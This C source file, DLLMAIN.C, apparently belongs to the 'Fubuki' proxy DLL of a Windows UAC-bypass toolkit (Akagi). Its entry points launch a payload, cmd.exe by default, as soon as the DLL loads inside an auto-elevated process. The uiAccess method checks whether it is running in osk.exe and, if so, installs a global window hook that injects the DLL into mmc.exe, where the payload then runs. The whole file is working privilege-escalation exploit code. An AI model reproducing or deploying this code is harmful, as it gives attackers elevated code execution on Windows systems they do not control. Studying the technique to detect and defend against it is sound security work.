/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2017
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     2.80
*
*  DATE:        06 Sept 2017
*
*  Proxy dll entry point, Fubuki Kai Ni.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

//disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 6102) // Using %s from failed function call at line %u

#include <windows.h>
#include "shared\ntos.h"
#include <ntstatus.h>
#include "shared\minirtl.h"
#include "shared\_filename.h"
#include "shared\util.h"
#include "unbcl.h"
#include "wbemcomn.h"

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define LoadedMsg      TEXT("Fubuki lock and loaded")

//default execution flow
#define AKAGI_FLAG_KILO  1

//suppress all additional output
#define AKAGI_FLAG_TANGO 2

DWORD g_AkagiFlag;

/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{
}

/*
* DefaultPayload
*
* Purpose:
*
* Process parameter if exist or start cmd.exe and exit immediatelly.
*
*/
VOID DefaultPayload(
    VOID
)
{
    BOOL bIsLocalSystem = FALSE, bReadSuccess;
    PWSTR lpParameter = NULL;
    ULONG cbParameter = 0L;

    OutputDebugString(LoadedMsg);

    ucmIsLocalSystem(&bIsLocalSystem);
    g_AkagiFlag = AKAGI_FLAG_KILO;     

    bReadSuccess = ucmReadParameters(
        &lpParameter,
        &cbParameter,
        &g_AkagiFlag,
        NULL,
        bIsLocalSystem);

    ucmLaunchPayload(
        lpParameter,
        cbParameter);

    if ((lpParameter == NULL) && (cbParameter == 0)) {
        if (g_AkagiFlag == AKAGI_FLAG_KILO)
            ucmQueryRuntimeInfo(FALSE);
    }
    else {
        if (bReadSuccess) {
            RtlFreeHeap(
                NtCurrentPeb()->ProcessHeap,
                0,
                lpParameter);
        }
    }
    ExitProcess(0);
}

/*
* UiAccessMethodHookProc
*
* Purpose:
*
* Window hook procedure for UiAccessMethod
*
*/
LRESULT CALLBACK UiAccessMethodHookProc(
    _In_ int nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*
* UiAccessMethodPayload
*
* Purpose:
*
* Defines application context and either:
* - installs windows hook for dll injection
* - run default payload in target app context
*
*/
VOID UiAccessMethodPayload(
    _In_ HINSTANCE hinstDLL
)
{
    LPWSTR lpFileName;
    HHOOK hHook;
    HOOKPROC HookProcedure;
    WCHAR szModuleName[MAX_PATH + 1];

    OutputDebugString(LoadedMsg);

    RtlSecureZeroMemory(szModuleName, sizeof(szModuleName));
    if (GetModuleFileName(NULL, szModuleName, MAX_PATH) == 0)
        return;

    lpFileName = _filename(szModuleName);
    if (lpFileName == NULL)
        return;

    //
    // Check if we are in the required application context
    // Are we inside osk.exe?
    //
    if (_strcmpi(lpFileName, TEXT("osk.exe")) == 0) {
        HookProcedure = (HOOKPROC)GetProcAddress(hinstDLL, "_FubukiProc2");
        if (HookProcedure) {
            hHook = SetWindowsHookEx(WH_CALLWNDPROC, HookProcedure, hinstDLL, 0);
            if (hHook) {
                //
                // Timeout to be enough to spawn target app.
                //
                Sleep(15000);
                UnhookWindowsHookEx(hHook);
            }
        }
        ExitProcess(0);
    }

    //
    // Are we inside target app?
    //
    if (_strcmpi(lpFileName, TEXT("mmc.exe")) == 0) {
        DefaultPayload();
    }
}

/*
* UiAccessMethodDllMain
*
* Purpose:
*
* Proxy dll entry point for uiAccess method.
* Need dedicated entry point because of additional code.
*
*/
BOOL WINAPI UiAccessMethodDllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH) {
        UiAccessMethodPayload(hinstDLL);
    }

    return TRUE;
}

/*
* DllMain
*
* Purpose:
*
* Default proxy dll entry point.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH) {
        DefaultPayload();
    }

    return TRUE;
}

/*
* EntryPoint
*
* Purpose:
*
* Entry point to be used in exe mode.
*
*/
VOID WINAPI EntryPoint(
    VOID)
{
    DefaultPayload();
}
